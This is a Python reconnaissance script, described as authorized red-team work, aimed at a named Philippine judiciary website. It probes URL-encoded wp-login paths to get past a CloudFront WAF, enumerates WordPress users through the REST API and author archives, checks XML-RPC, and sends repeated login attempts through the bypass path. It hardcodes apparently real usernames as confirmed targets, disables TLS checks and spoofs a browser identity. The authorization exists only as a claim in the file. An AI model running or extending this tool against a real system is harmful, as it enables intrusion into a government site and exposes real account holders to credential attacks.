#!/usr/bin/env python3
"""Authorized red-team recon for sc.judiciary.gov.ph — read-only, no brute force."""

import json
from datetime import datetime, timezone

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE = 'https://sc.judiciary.gov.ph'
HEADERS = {
    'User-Agent': (
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
        'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    ),
}
KNOWN_USERS = ['scweb', 'pio_tyke', 'pio_jerome', 'tyke-test-admin', 'pio_rus']
LOGIN_PATHS = [
    '/wp-login.php',
    '/wp%2Dlogin.php',
    '/wp%2dlogin.php',
    '/wp%2Dlogin%2ephp',
    '/%77p-login.php',
]


def session():
    s = requests.Session()
    s.verify = False
    s.headers.update(HEADERS)
    return s


def probe_paths():
    s = session()
    results = []
    for path in LOGIN_PATHS:
        try:
            r = s.get(BASE + path, timeout=20, allow_redirects=False)
            results.append({
                'path': path,
                'status': r.status_code,
                'location': r.headers.get('Location'),
                'login_page': r.status_code == 200 and 'user_login' in r.text.lower(),
            })
        except requests.RequestException as exc:
            results.append({'path': path, 'error': str(exc)})
    return results


def rest_users():
    s = session()
    url = f'{BASE}/wp-json/wp/v2/users'
    r = s.get(url, timeout=20)
    users = []
    if r.status_code == 200:
        try:
            for u in r.json():
                users.append({
                    'id': u.get('id'),
                    'slug': u.get('slug'),
                    'name': u.get('name'),
                    'link': u.get('link'),
                })
        except (json.JSONDecodeError, ValueError):
            pass
    return {'url': url, 'status': r.status_code, 'users': users}


def author_enum():
    s = session()
    results = []
    for uid in [1, 2, 16, 204, 205]:
        r = s.get(f'{BASE}/?author={uid}', timeout=15, allow_redirects=False)
        results.append({
            'author_id': uid,
            'status': r.status_code,
            'location': r.headers.get('Location'),
        })
    return results


def xmlrpc_check():
    s = session()
    r = s.get(f'{BASE}/xmlrpc.php', timeout=15)
    return {'status': r.status_code, 'blocked': r.status_code == 403}


def rate_limit_probe(attempts=5):
    s = session()
    statuses = []
    for i in range(attempts):
        data = {
            'log': 'nonexistent_redteam_probe',
            'pwd': f'probe{i}',
            'wp-submit': 'Log In',
            'testcookie': '1',
        }
        r = s.post(f'{BASE}/wp%2Dlogin.php', data=data, timeout=20, allow_redirects=False)
        statuses.append(r.status_code)
    return {
        'attempts': attempts,
        'status_codes': statuses,
        'login_reachable': any(code == 200 for code in statuses),
        'rate_limiting_detected': any(code in (429, 503) for code in statuses),
    }


def build_report():
    login_paths = probe_paths()
    bypass_works = any(r.get('login_page') for r in login_paths)
    waf_blocks_standard = any(
        r.get('path') == '/wp-login.php' and r.get('status') == 403 for r in login_paths
    )

    return {
        'meta': {
            'target': BASE,
            'assessment_date': datetime.now(timezone.utc).isoformat(),
            'scope': 'Authorized red team — read-only recon',
        },
        'findings': {
            'AUTHZ-VULN-01': {
                'title': 'CloudFront WAF wp-login bypass',
                'status': 'REMEDIATED' if waf_blocks_standard and not bypass_works else 'VULNERABLE',
                'detail': (
                    'Encoded login paths now return 403 alongside /wp-login.php. '
                    'WAF appears to normalize or block encoded variants.'
                    if waf_blocks_standard and not bypass_works
                    else 'Bypass path still serves login page while standard path is blocked.'
                ),
                'login_path_results': login_paths,
            },
            'AUTHZ-VULN-02': {
                'title': 'WordPress REST API user enumeration',
                'status': 'VULNERABLE',
                'rest_api': rest_users(),
            },
            'AUTHZ-VULN-03': {
                'title': 'Author archive user disclosure',
                'status': 'VULNERABLE',
                'author_redirects': author_enum(),
            },
            'INFO-01': {
                'title': 'XML-RPC status',
                'xmlrpc': xmlrpc_check(),
            },
            'INFO-02': {
                'title': 'Login rate limiting (blocked surface)',
                'rate_limit': rate_limit_probe(),
            },
        },
        'confirmed_users': KNOWN_USERS,
        'infrastructure': {
            'cdn': 'CloudFront',
            'origin': 'Apache/2.4.58 (Ubuntu)',
            'elb': 'awselb/2.0',
        },
    }


def main():
    report = build_report()
    out_json = 'readyTouse/AUTHZ-VULN-01-recon.json'
    with open(out_json, 'w', encoding='utf-8') as f:
        json.dump(report, f, indent=2)
    print(json.dumps(report, indent=2))
    print(f'\nSaved: {out_json}')


if __name__ == '__main__':
    main()
